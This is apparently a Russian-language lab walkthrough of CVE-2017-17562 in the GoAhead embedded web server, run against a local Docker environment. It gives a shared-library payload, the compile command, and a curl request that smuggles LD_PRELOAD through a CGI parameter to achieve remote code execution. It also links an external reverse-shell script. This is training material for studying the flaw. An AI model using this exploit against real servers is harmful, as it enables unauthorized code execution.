# CVE-2017-17562

### Материалы:

* [https://nvd.nist.gov/vuln/detail/CVE-2017-17562](https://nvd.nist.gov/vuln/detail/CVE-2017-17562)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17562)
* [https://securityonline.info/cve-2017-17562-goahead-httpd-2-5-3-5-remote-code-execution-vulnerability/](https://securityonline.info/cve-2017-17562-goahead-httpd-2-5-3-5-remote-code-execution-vulnerability/)

GoAhead — это встраиваемый веб-сервер компании Embedthis, который используется в продуктах Oracle, IBM, HP и других известных производителей.

Embedthis GoAhead до версии 3.6.5 позволяет удаленно выполнить код, если включен CGI и CGI-программа динамически компонуется. Это происходит в результате инициализации окружения форк CGI-скриптов с помощью недоверенных параметров HTTP-запроса в функции cgiHandler в файле cgi.c. В сочетании с динамическим компоновщиком glibc такое поведение может быть использовано для удаленного выполнения кода с помощью специальных имен параметров, таких как LD\_PRELOAD. Злоумышленник может поместить полезную нагрузку разделяемого объекта в тело запроса и сослаться на него, используя /proc/self/fd/0.

### Эксплуатация уязвимости

> Контейнер с уязвимой средой находится в директории /home/user/Hackathon/vulhub-master/goahead/CVE-2017-17562

Для запуска уязвимой среды выполните команду:

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8080 будет доступна веб-страница GoAhead 3.6.4

\--- скрин web ----

CGI-скрипты доступны по адресу http://ваш-ip:8080/cgi-bin/index

\---- скрин страницы со скриптами ----

Для эксплуатации уязвимости скомпилируйте данный код в динамическую библиотеку

```cpp
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World!\n", 14);
}
```

Для компиляции в x86/64 среде выполните команду:

```
gcc -shared -fPIC payload.c -o payload.so
```

Где payload.c - это файл с вышеупомянутым кодом

\---- скрин с компиляцией ----

Используйте утилиту curl, чтобы произвести атаку:

```
curl -X POST --data-binary @payload.so "http://ваш-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i 
```

\---- скрин выполнения команды ----

В ответе мы можем видеть, что появился заголовок hello со значением World!, что свидетельствует об успешном выполнении кода

\---- скрин пакета ----

Для автоматизации получения обратной оболочку можно использовать [данный](https://www.exploit-db.com/exploits/43360) скрипт

\---- скрин получения ----

вазух&#x20;

\---- скрин вазух ----
